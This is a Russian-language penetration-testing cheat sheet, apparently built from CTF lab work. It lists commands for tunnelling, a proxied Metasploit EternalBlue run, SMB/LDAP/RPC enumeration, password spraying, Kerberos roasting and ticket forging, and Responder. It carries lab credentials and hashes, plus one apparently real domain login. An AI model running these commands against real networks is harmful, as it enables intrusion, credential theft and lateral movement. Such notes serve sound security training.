- У себя

./chisel server --port 9090 --reverse

(таким образом обращаясь к нашему локал хост или 10.71.101.248 на порт 8000 мы попадаем на 80 атакуемого хоста)


# Динамический проброс портов и тунелирование 

	cat /etc/proxychains4.conf
		socks4         127.0.0.1 9050

	ssh -D 9050 vboxuser@192.168.50.200 -------- (на локал хост открываем порт 9050 и через proxychains выходим напрямую от себя на 9050 проксисервера 50.200 )
       
	proxychains nmap 10.0.2.10 

# Смена таблици маршрутицации 

	sudo ip route add 192.168.134.0/24 via 10.200.100.6
	
 	route ADD 192.168.135.0 MASK 255.255.255.0  10.200.100.5 

# Проброс експлойтов метасплойт через ssh проброс портов

ssh -D 9050 vboxuser@192.168.50.200  (на локал хост 50.200 открываем порт 9050 и через proxychains выходим напрямую от себя на 9050 проксисервера )

msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.0.2.10
rhosts => 10.0.2.10
msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost 10.0.2.15
lhost => 10.0.2.15
msf6 exploit(windows/smb/ms17_010_eternalblue) > set proxies socks4:127.0.0.1:9050
proxies => socks4:127.0.0.1:9050              
msf6 exploit(windows/smb/ms17_010_eternalblue) > set reverseallowproxy true
reverseallowproxy => true
msf6 exploit(windows/smb/ms17_010_eternalblue) > set reverselistenerbindaddress 127.0.0.1
reverselistenerbindaddress => 127.0.0.1
msf6 exploit(windows/smb/ms17_010_eternalblue) > set reverselistenerbindport 4455

потом
ssh -R 4444:127.0.0.1:4455 vboxuser@192.168.50.200 -vN

и RUN
      
# сканирование на веб дырки

nikto -url http://10.10.217.189/ 





# Сетевые шары

# SMB

smbcacls -N '//10.10.10.103/Department Shares'

smbclient -L 10.10.217.189 - подключение по смб

smbclient --no-pass //10.10.217.189/Users -смотрим папки

smbclient //10.10.218.125/users -c 'recurse;ls'   (Ркурсивно просмотреть все шары)

*** Скачать рекурсивно все файлы изнутри

smb: \> recurse on
smb: \> prompt off
smb: \> mget *



smbclient //192.168.50.232/Users -U ''

smbclient -N //192.168.50.232/Users 

smbclient //192.168.50.232/Users -U Alexs

smbclient -L 192.168.50.200 -U Administrator

smbclient //192.168.50.162/Users -U Alex - переход по директориям

<< smbclient \\\\192.168.50.232\\Users -U Alexs >>

smbmap -H 10.10.149.120 -u anonymous

smbmap -u '' -p '' -H 10.10.149.120



smbmap -u 'john' -p 'nt:lm_hash' -H 192.168.50.200

smbmap -d active.htb -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -H 10.10.10.100      !Для домена!

impacket-smbclient Tiffany.Molina:NewIntelligenceCorpUser9876@10.10.10.248
impacket-smbclient -k absolute.htb/svc_smb@dc.absolute.htb -target-ip 10.10.11.181 (перед этим получить tgt и  export KRB5CCNAME= )
- shares - list available shares
- use {sharename} - connect to an specific share

Скачать сетевую шару!!!

smbget -R smb://10.10.11.207/Development

Примонтировать smb шару

mount -t cifs //10.10.10.134/Backups /mnt/smb


# crackmapexec

Показать доступные пользователю шары

	crackmapexec smb 10.10.10.182 -u r.thompson -p rY4n5eva --shares

Брут локального администратора 

	cme smb discovery/hosts/windows.txt --local-auth -u Administrator -p passwords.txt
 
выполнение комманнд

crackmapexec 192.168.50.200 -u 'Administrator' -p 'Pass1' 'Pass2' -x ipconfig

crackmapexec smb 10.10.38.153 -u 'nik' -p 'ToastyBoi!' --shares  -Доступные шары для узера

crackmapexec smb 10.10.11.222 -u '' -p '' --shares   -анонимный вход

парольные политики

crackmapexec 192.168.50.200 -u 'Administrator' -p 'Pass1' 'Pass2' --pass-pol

crackmapexec 192.168.50.200 -u 'Administrator' -p 'Pass1' 'Pass2' -local-auth --sam

Перечисление открытых шар сети

crackmapexec smb 192.168.50.200/24

crackmapexec smb 192.168.50.162 -u 'Kevin' -p dict.txt Побрутить пароли в СМБ

crackmapexec smb razor.thm -u wili -p poteto --rid-brute брутит пользователей домена

crackmapexec smb 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --users  (Показать всех пользователей домена)


https://wiki.porchetta.industries/smb-protocol/enumeration/enumerate-domain-users

-------------------------------------------------снаружи домена 
сенить пароль пользователя smb

smbpasswd -r razo.thm -U bardkey

-------------еще энумерация SMB------------------------
enum4linux 10.10.11.108 


# RPC client (использует smb)
rpcclient 10.10.38.153 -U nik - нужен пароль - может перечислять пользователей и группы в Домене  (Remote Procedure Call работает на портах TCP 135 и UDP 135)

rpcclient 10.10.38.153 -U "" -N  - не нужен пароль

enumdomusers - перчисляет пользователей 

enumdomgroup - перечисляет группы

queryusergroups 0x47b - к какой группе принадлежит

querygroup 0x201 - что за группа

queryuser 0x47b - инфо о пользователе

 Она может использоваться для выполнения различных действий, таких как получение информации о доступных службах, выполнение удаленных процедур и т. д.

-------------еще энумерация SMB------------------------
enum4linux 10.10.11.108 


# LDAP (Стоит проверить, разрешает ли служба LDAP анонимные привязки, с помощью инструмента ldapsearch.- имена даты пароли и т.д все выдвет!!!!)

!!!!!Временные метки ЛДАП

	ldapsearch -x -H ldap://sizzle.htb.local -s base namingcontexts

https://www.epochconverter.com/ldap

	ldapsearch -H ldap://192.168.2.251 -x -D 'ЛаврентьевАВ@ta-d.local' -w '414216819' -b 'dc=ta-d,dc=local' "(&(objectClass=user)(memberOf=CN=Администраторы домена,CN=Users,DC=ta-d,DC=local))" | grep sAMAccountName

---Выбираем user из группы Администраторы домена

ldapsearch -x -H ldap://10.10.10.175 -b 'DC=EGOTISTICAL-BANK,DC=LOCAL' -s sub

ldapsearch -H ldap://10.10.10.20 -x -b "DC=htb, DC=local" '(objectClass=User)' "sAMAccountName" | grep sAMAccountName    (выбираем имена)

ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb, DC=local" '(objectClass=User)' (толлко юзеры!!!)


(может сразу не работать!!!)

ldapsearch -H ldap://10.10.10.161 -x

ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb, DC=local"

ldapsearch -H ldap://10.10.10.20 -x -b "DC=htb, DC=local" '(objectClass=User)' "sAMAccountName" | grep sAMAccountName

ldapsearch -H ldap://dc1.scrm.local -U ksimpson -b 'dc=scrm,dc=local'

	ldapsearch -x -H ldap://10.10.10.182 -s base namingcontexts (Инфо о домене)
 	
	ldapsearch -x -H ldap://10.10.10.182 -s sub -b 'DC=cascade,DC=local' (Инфо в домене)

 	cat ldap_info| awk '{print $1}' | sort| uniq -c| sort -nr | grep ':'


можно попробовать -
[windapsearch](https://github.com/ropnop/windapsearch)

-------------еще энумерация LDAP и поиск доменных юзеров------------------------

impacket-GetADUsers egotistical-bank.local/ -dc-ip 10.10.10.175 -debug

impacket-GetADUsers active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -all

------------еще ldap-shell

https://github.com/PShlyundin/ldap_shell


# KERBRUTE

https://github.com/ropnop/kerberos_windows_scripts/blob/master/kinit_horizontal_brute.sh

https://github.com/ropnop/kerbrute

./kerbrute_linux_amd64 userenum --dc 192.168.1.19 -d ignite.local users.txt  (Проверка валидных пользоввателей с преатентификациеей)

~/kerbrute_linux_amd64 userenum --dc 10.10.10.52 -d htb.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt (Проверка валидных пользоввателей с преатентификациеей)


./kerbrute_linux_amd64 passwordspray --dc 192.168.1.19 -d ignite.local users.txt Password@1  (Распыление пароля)

./kerbrute_linux_amd64 bruteuser --dc 192.168.1.19 -d ignite.local pass.txt username

kerbrute passwordspray userlist NewIntelligenceCorpUser9876 --dc 10.10.10.248 -d intelligence.htb

 Может не сработать тогда надо -->>>  crackmapexec smb 10.10.10.248 -u username.txt -p NewIntelligenceCorpUser9876 

# Поиск учетных записей без преаутентификации керберос (НУЖЕН СПИСОК ПОЛЬЗОВАТЕЛЕЙ)

python3 GetNPUsers.py enterprise.thm/ -dc-ip 10.10.38.153 -usersfile /home/max/users.txt -no-pass

impacket-GetNPUsers -no-pass raz0rblack.thm/ -usersfile user.txt -format hashcat -outputfile hash.txt

(НУЖНА АУТЕНТ ПО КЕРБЕРОС И НЕ НУЖНА)

impacket-GetNPUsers -dc-ip 10.10.10.161 htb.local/ -usersfile forest_user

impacket-GetNPUsers -dc-ip 10.10.10.161 htb.local/ -usersfile forest_user -request

impacket-GetNPUsers -dc-ip 10.10.10.161 -request 'htb.local/' (без списка пользователей)

# Получение идентификатора домена

impacket-getPac -targetUser administrator scrm.local/ksimpson:ksimpson

#Получить идентификатор пользователя

rpcclient $> lookupnames james(username)

# Получить TGT

impacket-getTGT scrm.local/ksimpson:ksimpson (домен/логин:пароль)

export KRB5CCNAME=ksimpson.ccache

sudo apt-get install krb5-user

kinit OOREND@REBOUND.HTB (также получить тикет и кеширует на диске)

klist - список билетов керберос

# Создание Silver Ticket для Administrator

impacket-ticketer -spn MSSQLSvc/dc1.scrm.local -user-id 500 Administrator -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local

(хеш - ntlm хеш пароля службы) 

# Сщздание голден тикет из-за уязвимости ms14

goldenPac.py 'htb.local/james:J@m3s_P@ssW0rd!@mantis'

# Глянуть SPN (НУЖЕН ПОЛЬЗОВАТЕЛЬ И ПАРОЛЬ)

python3 GetUserSPNs.py -dc-ip 10.10.154.84 lab.enterprise.thm/nik:ToastyBoi! -request

impacket-GetUserSPNs -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request

---получение SPN по билету TGT

impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -k -dc-host dc1.scrm.local -no-pass

impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -k -dc-host dc1.scrm.local -no-pass -request


"setspn -T TestDomain -Q */*"  (Теперь производится поиск доступных SPN в текущей среде при помощи следующей команды:)

# Синхронизация по времени с контролером домена

	sudo ntpdate -s 10.10.10.248 

(синхронизация по времени с сервером для крберерос)



# dacledit 

dacledit.py -action 'write' -rights 'WriteMembers' -principal 'm.lovegod' -target 'Network Audit group' 'absolute.htb'/'m.lovegod:AbsoluteLDAP2022!' -k -dc-ip 10.10.11.181

# Для взлома билета удаленной (SPN) службы используется скрипт tgsrepcrack.py из репозитория Kerberoast. 

python tgsrepcrack.py wordlist.txt 1-40a10000-Bob@MSSQLSERVER~SQL-Server.testdomain.com~1433-TESTDOMAIN.COM.kirbi

# Доступные диски для монтирования mountd 2049

showmount -e 10.10.149.120 
showmount показывает нам какие файловые системы доступны для монтирования
$ mkdir smb
$ sudo mount -t nfs -o vers=2 10.10.149.120:/users ./smb
$ sudo -i




# скрипты для сканирования уязвимостей
script vuln -p 80 ip скрипты уязвимостей
nmap [host] --script vuln -sV
https://github.com/SkillfactoryCoding/HACKER-OS-nmap.vulners
https://github.com/SkillfactoryCoding/HACKER-OS-vulscan

printnightMare (135 port)
impacket-rpcdump @10.10.211.217 | egrep 'MS-RPRN|MS-PAR'

# Responder (слушаем интерфейс)

sudo responder -I tun0 -wdF

sudo tcpdump -i wlan0 icmp


# rsync

rsync --list-only 10.129.228.37::

rsync --list-only 10.129.228.37::public


rsync 10.129.228.37::public/flag.txt flag.txt



